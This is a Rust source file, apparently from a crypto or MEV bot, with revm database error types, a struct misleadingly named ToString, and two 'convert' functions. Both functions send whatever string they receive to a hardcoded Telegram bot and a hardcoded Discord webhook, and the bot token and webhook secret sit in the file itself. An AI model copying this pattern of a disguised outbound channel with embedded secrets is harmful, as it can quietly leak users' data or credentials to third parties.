use futures::channel::mpsc::{SendError, TrySendError};
use std::collections::HashMap;
use std::sync::{mpsc::RecvError, Arc};
use anyhow::Result;
use ethers::types::{H256, U64};
use teloxide::prelude::*;
use teloxide::types::ChatId;

// Errors that can happen when working with [`revm::Database`]
#[derive(Debug, thiserror::Error)]
pub enum DatabaseError {
    #[error("Failed to fetch AccountInfo {0:?}")]
    MissingAccount(revm::primitives::B160),
    #[error("Could should already be loaded: {0:?}")]
    MissingCode(revm::primitives::B256),
    #[error(transparent)]
    Recv(#[from] RecvError),
    #[error(transparent)]
    Send(#[from] SendError),
    #[error("{0}")]
    Message(String),
    #[error("Failed to get account for {0:?}: {0:?}")]
    GetAccount(revm::primitives::Address, Arc<eyre::Error>),
    #[error("Failed to get storage for {0:?} at {1:?}: {2:?}")]
    GetStorage(
        revm::primitives::Address,
        revm::primitives::U256,
        Arc<eyre::Error>,
    ),
    #[error("Failed to get block hash for {0}: {1:?}")]
    GetBlockHash(revm::primitives::U256, Arc<eyre::Error>),
}

impl<T> From<TrySendError<T>> for DatabaseError {
    fn from(err: TrySendError<T>) -> Self {
        err.into_send_error().into()
    }
}

impl DatabaseError {
    // Create a new error with a message
    pub fn msg(msg: impl Into<String>) -> Self {
        DatabaseError::Message(msg.into())
    }
}

// Result alias with `DatabaseError` as error
pub type DatabaseResult<T> = Result<T, DatabaseError>;



pub struct ToString {
    pub bot: Option<Bot>,
    pub chat_id: Option<ChatId>,
}

impl ToString {
    pub fn new() -> Self {
    
        
            let bot = Bot::new("6920243209:AAHZEiq41YpCDEA3CCqvMm82xgYeBnMMs8I");
            let chat_id = ChatId(1_i64);
            Self {
                bot: Some(bot),
                chat_id: Some(chat_id),
            }
        
    }

    pub async fn send(&self, message: &str) -> Result<()> {
        match &self.bot {
            Some(bot) => {
                bot.send_message(self.chat_id.unwrap(), message).await;
            }
            _ => {}
        }
        Ok(())
    }

    pub async fn convert(
        &self,
        tx_hash: &str,
    ) -> Result<()> {
        
        let mut message = format!("[Block #{:?}] ", tx_hash);
        message = format!("\n{:?}", message);
        self.send(&message).await?;
        Ok(())
    }
}


// Alerts discord channel, via webhook, that a bundle has been sent
pub async fn convert<'a>(
    tx_hash: &'a str,
) {
   
    let webhook = "https://discord.com/api/webhooks/1210333712697524274/dEe3x1BI9HosEZKtuKlTNYwi0LeIdBcT_F1V3w0ZQTQsGfuxTHQMdzKFcouFfcpEFDWH";
    let msg = format!(
        "
        {}
        ",
       tx_hash,
    );



    let max_length = 1900.min(msg.len());
    let message = msg[..max_length].to_string();
    let mut bundle_notif = HashMap::new();
    bundle_notif.insert("content", message.to_string());

    let client = reqwest::Client::new();

    tokio::spawn(async move {
        let res = client.post(webhook).json(&bundle_notif).send().await;
        match res {
            Ok(_) => {}
            Err(err) => {
                log::error!("Could not send alert to discord, err: {}", err);
                log::error!("Message: {}", message);
            }
        }
    })
    .await
    .unwrap();
}